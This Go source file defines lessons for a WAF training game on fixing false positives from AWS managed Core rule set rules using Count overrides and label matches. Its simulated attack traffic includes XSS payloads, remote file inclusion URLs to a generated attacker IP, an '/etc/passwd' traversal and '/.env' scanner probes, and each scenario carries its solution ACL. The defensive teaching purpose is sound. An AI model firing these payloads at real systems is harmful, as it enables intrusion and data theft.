package scenario

import (
	"math/rand/v2"
	"strings"

	w "wafdy/internal/wafrule"
)

// ---------------------------------------------------------------------------
// Level 4: マネージドルールを飼いならす
// マネージドルールが正規の通信を止めたとき、保護を保ったまま直す (Count への上書き + ラベル)。
// ---------------------------------------------------------------------------

const crs = "AWSManagedRulesCommonRuleSet"

var crsLesson = []Text{
	T("【マネージドルールの誤検知を直す基本】ルールグループ全体を外したり Count にしたりすると、そのグループの保護がすべてなくなります。止めすぎている「1 つのルール」だけを Count に上書きし、そのルールが付ける「ラベル」を使って、例外以外を自分のルールでブロックし直すのが定石です。",
		"【The standard fix for managed-rule false positives】Removing the whole rule group or setting it to Count drops all of its protection. The standard approach is to override only the one rule that over-blocks to Count, then use the label that rule adds to re-block everything except your exception with your own rule."),
	T("【ラベルとは】マネージドルールは一致したリクエストに awswaf:managed:aws:core-rule-set:SizeRestrictions_Body のようなラベルを付けます。Count に上書きしても、ラベルは付きます。後ろのルールで「ラベル一致 (Label match)」ステートメントを使うと、このラベルを条件にできます。",
		"【What labels are】Managed rules add labels such as awswaf:managed:aws:core-rule-set:SizeRestrictions_Body to matching requests. Labels are still added when a rule is overridden to Count. A later rule can use a \"Label match\" statement to make that label a condition."),
	T("【順番が大切】ラベルは、そのラベルを付けるルールより後 (優先度の数字が大きい) のルールでしか見えません。ラベルを使うルールは、マネージドルールグループより下に置きます。",
		"【Order matters】A label is only visible to rules evaluated after the rule that adds it (with a larger priority number). Place the rule that uses the label below the managed rule group."),
	T("【この問題での操作】Web ACL に「Core rule set」(AWSManagedRulesCommonRuleSet) を追加し、ルールグループの編集画面で該当ルールの「Override rule action」を Count にします。その下に、ラベル一致を使うカスタムルールを作ります。",
		"【How to do it here】Add the \"Core rule set\" (AWSManagedRulesCommonRuleSet) to your web ACL, and in the rule group's edit screen set the relevant rule's \"Override rule action\" to Count. Below it, create a custom rule that uses a label match."),
	T("【注意】Core rule set だけで 700 WCU を使います (Web ACL の上限は既定 1,500)。追加できないときは、こなした問題のルールを先に削除しましょう。また Core rule set はほかの問題の通信にも効くので、この問題をこなしたら外すか見直しましょう。",
		"【Note】The Core rule set alone uses 700 WCUs (a web ACL's limit is 1,500 by default). If you can't add it, delete the rules for problems you've already mastered first. The Core rule set also affects traffic in other problems, so remove or revisit it once you've mastered this one."),
}

func randomText(r *rand.Rand, n int) string {
	const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	var b strings.Builder
	for i := 0; i < n; i++ {
		b.WriteByte(letters[r.IntN(len(letters))])
	}
	return b.String()
}

func noUA(req Request) Request { return withUA(req, "") }

func registerLabTuning() {
	lab(4, &Scenario{
		ID:    "lab-4-crs-size-body",
		CVE:   "AWSManagedRulesCommonRuleSet",
		Title: T("大きなファイルを止める SizeRestrictions_BODY", "SizeRestrictions_BODY blocks large files"),
		Summary: T("Core rule set を入れたら、正規の大きなファイルのアップロードまで止まりました。保護は保ったまま直してください。",
			"After adding the Core rule set, legitimate large file uploads started getting blocked. Fix it without losing protection."),
		Topics: []Text{T("Override rule action (Count)", "Override rule action (Count)"), T("ラベル一致", "Label match"), T("ルールの順番", "Rule order")},
		Briefing: []Text{
			T("セキュリティ強化のため、AWS マネージドルールの Core rule set を Web ACL に入れました。ところが翌日から「書類のアップロード (POST /upload) ができない」という問い合わせが相次いでいます。",
				"To harden security, you added the AWS managed Core rule set to your web ACL. Since the next day, users keep reporting that document uploads (POST /upload) fail."),
			T("調べると、Core rule set の SizeRestrictions_BODY ルール (Body が 8 KB を超えるリクエストをブロック) が原因でした。ALB の WAF は Body の先頭 8 KB までしか検査できないため、このルールは「検査できない部分に攻撃を隠す」手口を防ぐ役目を持っています。",
				"The culprit is the Core rule set's SizeRestrictions_BODY rule, which blocks requests whose body exceeds 8 KB. WAF on ALB can only inspect the first 8 KB of a body, so this rule exists to stop attacks hidden in the uninspected part."),
		},
		Conditions: []Text{
			T("/upload への大きな Body は正規の利用です。それ以外の場所 (API など) への 8 KB を超える Body は、これまでどおりブロックしてください。",
				"Large bodies sent to /upload are legitimate. Keep blocking bodies over 8 KB everywhere else (such as the API)."),
			T("Core rule set のほかのルール (XSS の検知など) の保護は、/upload を含めて残してください。",
				"Keep the protection of the Core rule set's other rules (such as XSS detection), including for /upload."),
		},
		Lesson: crsLesson,
		Hints: []Text{
			T("SizeRestrictions_BODY だけを Count に上書きし、ラベル awswaf:managed:aws:core-rule-set:SizeRestrictions_Body と「URI path が /upload で始まらない」の AND でブロックします。",
				"Override only SizeRestrictions_BODY to Count, and block on the label awswaf:managed:aws:core-rule-set:SizeRestrictions_Body AND \"URI path does not start with /upload\"."),
		},
		Patterns: []Pattern{
			{Attack, T("API への巨大な Body", "Huge body sent to the API"), 12, func(r *rand.Rand) Request {
				return atk(r, postJSON(r, "/api/comment", `{"comment":"`+randomText(r, 12000)+`"}`))
			}},
			{Attack, T("口コミ欄の XSS", "XSS in the review form"), 12, func(r *rand.Rand) Request {
				return atk(r, comment(r, "<script>alert(document.cookie)</script>"))
			}},
			{Attack, T("アップロード欄の XSS", "XSS in the upload form"), 12, func(r *rand.Rand) Request {
				return atk(r, post(r, "/upload", form("title", `<img src=x onerror=alert(1)>`, "file", "x")))
			}},
			{Benign, T("書類の大きなアップロード", "Large document uploads"), 20, func(r *rand.Rand) Request {
				ct, body := multipartUpload("contract.pdf", randomText(r, 20000))
				return withBody(post(r, "/upload", ""), ct, body)
			}},
			{Benign, lblComment, 15, benignComment},
			{Benign, lblBrowse, 15, browse},
		},
		SolutionACL: []*w.Rule{
			w.ManagedGroup(crs, "SizeRestrictions_BODY"),
			w.Block("block-large-body-except-upload", w.And(
				w.Label(w.CoreRuleSetLabel+"SizeRestrictions_Body"),
				w.Not(w.StartsWith("/upload", w.UriPath(), w.Lowercase)),
			)),
		},
		SolutionNote: []Text{
			T("1 つ目のルールで Core rule set を入れ、SizeRestrictions_BODY だけを Count にします。ほかのルール (XSS など) はこれまでどおり Block のままです。",
				"The first rule adds the Core rule set with only SizeRestrictions_BODY overridden to Count. The other rules (XSS and so on) still block as before."),
			T("2 つ目のルールで「SizeRestrictions_Body のラベルが付いた」AND「/upload ではない」リクエストをブロックし直します。ラベルを使うので、このルールは必ずルールグループより後に置きます。",
				"The second rule re-blocks requests that \"carry the SizeRestrictions_Body label\" AND \"are not for /upload\". Because it uses the label, it must come after the rule group."),
			T("/upload の 8 KB より後ろは WAF で検査されません。アップロードされたファイルは、アプリ側でもウイルス検査などをしましょう。",
				"Anything after the first 8 KB of an /upload body isn't inspected by WAF. Scan uploaded files in the app as well."),
		},
		Pitfall: w.ManagedGroup(crs, "SizeRestrictions_BODY"),
		PitfallNote: []Text{
			T("SizeRestrictions_BODY を Count にしただけで、ラベルを使ってブロックし直していない状態です。アップロードは通るようになりますが、API への巨大な Body も素通りになります。",
				"This just overrides SizeRestrictions_BODY to Count without re-blocking via the label. Uploads work again, but huge bodies sent to the API also pass straight through."),
		},
	})

	lab(4, &Scenario{
		ID:    "lab-4-crs-no-user-agent",
		CVE:   "AWSManagedRulesCommonRuleSet",
		Title: T("User-Agent を送らない IoT 機器", "IoT devices that send no User-Agent"),
		Summary: T("Core rule set の NoUserAgent_HEADER が、工場のセンサーからのデータ送信を止めています。センサーだけを例外にしてください。",
			"The Core rule set's NoUserAgent_HEADER rule is blocking data from factory sensors. Make an exception for the sensors only."),
		Topics: []Text{T("例外の範囲を絞る", "Narrowly scoped exceptions"), T("ラベル一致", "Label match")},
		Briefing: []Text{
			T("工場のセンサーは、POST /api/telemetry に計測データを送ってきます。小さな機器のため、User-Agent ヘッダーを送りません。Core rule set の NoUserAgent_HEADER ルールが、このデータ送信をすべてブロックしています。",
				"Factory sensors send measurements to POST /api/telemetry. Being tiny devices, they don't send a User-Agent header. The Core rule set's NoUserAgent_HEADER rule blocks all of this data."),
			T("一方、User-Agent を送らないスキャナーによる探索も毎日来ています。",
				"Meanwhile, scanners that send no User-Agent probe the site every day."),
		},
		Conditions: []Text{
			T("センサーは必ず X-Device-Key ヘッダーを付けて /api/telemetry に送ってきます。",
				"Sensors always send to /api/telemetry with an X-Device-Key header."),
			T("それ以外の User-Agent のないリクエストは、/api/telemetry へのものも含めて、これまでどおりブロックしてください。",
				"Keep blocking every other request without a User-Agent, including ones sent to /api/telemetry."),
		},
		Lesson: crsLesson,
		Hints: []Text{
			T("NoUserAgent_HEADER を Count にし、ラベル NoUserAgent_Header が付いたもののうち「/api/telemetry へ X-Device-Key 付きで来た」もの以外をブロックします。",
				"Override NoUserAgent_HEADER to Count, then block requests carrying the NoUserAgent_Header label unless they \"came to /api/telemetry with X-Device-Key\"."),
		},
		Patterns: []Pattern{
			{Attack, T("User-Agent なしのスキャナー", "Scanners without a User-Agent"), 14, func(r *rand.Rand) Request {
				return noUA(atk(r, get(r, pick(r, []string{"/.env", "/wp-login.php", "/backup.zip"}), "")))
			}},
			{Attack, T("鍵なしでセンサーになりすます", "Posing as a sensor without the key"), 14, func(r *rand.Rand) Request {
				return noUA(atk(r, postJSON(r, "/api/telemetry", `{"temp":9999,"device":"fake"}`)))
			}},
			{Attack, T("鍵付きで別の場所を探索", "Probing elsewhere with a key"), 12, func(r *rand.Rand) Request {
				return withHeader(noUA(atk(r, get(r, "/api/users", ""))), "X-Device-Key", "stolen-key")
			}},
			{Benign, T("センサーの計測データ", "Sensor measurements"), 25, func(r *rand.Rand) Request {
				req := noUA(postJSON(r, "/api/telemetry", `{"temp":`+randomText(r, 2)+`,"device":"line-3"}`))
				return withHeader(req, "X-Device-Key", "dk-"+randomText(r, 16))
			}},
			{Benign, lblBrowse, 20, browse},
		},
		SolutionACL: []*w.Rule{
			w.ManagedGroup(crs, "NoUserAgent_HEADER"),
			w.Block("block-no-user-agent-except-sensors", w.And(
				w.Label(w.CoreRuleSetLabel+"NoUserAgent_Header"),
				w.Not(w.And(
					w.StartsWith("/api/telemetry", w.UriPath(), w.Lowercase),
					w.Present(w.Header("x-device-key")),
				)),
			)),
		},
		SolutionNote: []Text{
			T("例外は「/api/telemetry への」AND「X-Device-Key 付きの」リクエストだけに絞ります。どちらか片方だけだと、鍵なしのなりすましや、鍵を盗んだ探索が通ってしまいます。",
				"Narrow the exception to requests that are \"for /api/telemetry\" AND \"carry X-Device-Key\". With only one of the two, fake sensors without keys or probing with a stolen key would get through."),
			T("WAF はヘッダーの値が本物の鍵かどうかまでは確かめられません。鍵の検証はアプリ (または API Gateway の認可) で行います。",
				"WAF can't verify that the header holds a genuine key. Validate keys in the app (or with API Gateway authorization)."),
		},
		Pitfall: w.ManagedGroup(crs, "NoUserAgent_HEADER"),
		PitfallNote: []Text{
			T("NoUserAgent_HEADER を Count にしただけの状態です。センサーは通りますが、User-Agent なしのスキャナーもすべて通ってしまいます。",
				"This just overrides NoUserAgent_HEADER to Count. Sensors get through, but so does every scanner without a User-Agent."),
		},
	})

	lab(4, &Scenario{
		ID:    "lab-4-crs-rfi-webhook",
		CVE:   "AWSManagedRulesCommonRuleSet",
		Title: T("社内ツールの Webhook と GenericRFI", "An internal webhook tool vs. GenericRFI"),
		Summary: T("Webhook の動作確認ツールが、IP アドレス入りの URL を送るために GenericRFI_QUERYARGUMENTS に止められています。",
			"A webhook test tool sends URLs containing IP addresses and gets stopped by GenericRFI_QUERYARGUMENTS."),
		Topics: []Text{T("ルール単位の例外", "Per-rule exceptions"), T("ラベル一致", "Label match")},
		Briefing: []Text{
			T("社内の開発者は、Webhook の動作確認ツール GET /tools/webhooks/test?url=<送信先> で、http://10.1.2.3:8080/hook のような社内の IP アドレスに試験送信しています。",
				"Internal developers use the webhook test tool GET /tools/webhooks/test?url=<destination> to send test calls to internal IP addresses such as http://10.1.2.3:8080/hook."),
			T("Core rule set の GenericRFI_QUERYARGUMENTS ルールは、クエリパラメータに IP アドレス入りの URL があると、リモートファイルインクルード (RFI) 攻撃とみなしてブロックします。このツールが使えなくなりました。",
				"The Core rule set's GenericRFI_QUERYARGUMENTS rule treats URLs with IP addresses in query parameters as remote file inclusion (RFI) attacks and blocks them. The tool no longer works."),
		},
		Conditions: []Text{
			T("RFI 攻撃 (index.php?page=http://<IP>/shell.txt など) は、これまでどおりブロックしてください。",
				"Keep blocking RFI attacks (such as index.php?page=http://<IP>/shell.txt)."),
			T("例外にするのは /tools/webhooks/ の下だけです。Core rule set のほかのルールの保護は残してください。",
				"Only paths under /tools/webhooks/ get the exception. Keep the protection of the Core rule set's other rules."),
		},
		Lesson: crsLesson,
		Patterns: []Pattern{
			{Attack, T("PHP へのリモートファイルインクルード", "Remote file inclusion against PHP"), 14, func(r *rand.Rand) Request {
				return atk(r, get(r, "/index.php", q("page", "http://"+attackerIP(r)+"/shell.txt")))
			}},
			{Attack, T("テンプレート指定への RFI", "RFI through the template parameter"), 14, func(r *rand.Rand) Request {
				return atk(r, get(r, "/view", q("template", "https://"+attackerIP(r)+":8443/evil.tpl")))
			}},
			{Attack, T("ツール経由のパストラバーサル", "Path traversal through the tool"), 10, func(r *rand.Rand) Request {
				return atk(r, get(r, "/tools/webhooks/test", q("url", "../../etc/passwd")))
			}},
			{Benign, T("Webhook の試験送信", "Webhook test calls"), 25, func(r *rand.Rand) Request {
				req := get(r, "/tools/webhooks/test", q("url", pick(r, []string{"http://10.1.2.3:8080/hook", "http://172.16.0.5/notify", "https://10.20.30.40/api/events"})))
				req.ClientIP = officeIP(r)
				return req
			}},
			{Benign, lblBrowse, 20, browse},
		},
		SolutionACL: []*w.Rule{
			w.ManagedGroup(crs, "GenericRFI_QUERYARGUMENTS"),
			w.Block("block-rfi-except-webhook-tool", w.And(
				w.Label(w.CoreRuleSetLabel+"GenericRFI_QueryArguments"),
				w.Not(w.StartsWith("/tools/webhooks/", w.UriPath(), w.Lowercase)),
			)),
		},
		SolutionNote: []Text{
			T("例外にするのは GenericRFI_QUERYARGUMENTS だけなので、/tools/webhooks/ でもパストラバーサル (GenericLFI) などのほかの保護は効いたままです。",
				"Only GenericRFI_QUERYARGUMENTS gets the exception, so other protections such as path traversal (GenericLFI) still apply under /tools/webhooks/."),
			T("本番では、社内ツールの例外にオフィスの IP セットも組み合わせると、さらに安全です。",
				"In production, combining the internal-tool exception with your office IP set makes it even safer."),
		},
		Pitfall: w.ManagedGroup(crs),
		PitfallNote: []Text{
			T("Core rule set を何も調整せずに入れた状態です。攻撃は止まりますが、社内の Webhook ツールが使えません。だからといってルールグループを外すと、すべての保護がなくなります。",
				"This is the Core rule set with no tuning. Attacks are stopped, but the internal webhook tool can't be used. Removing the rule group to fix that would drop all protection."),
		},
	})
}
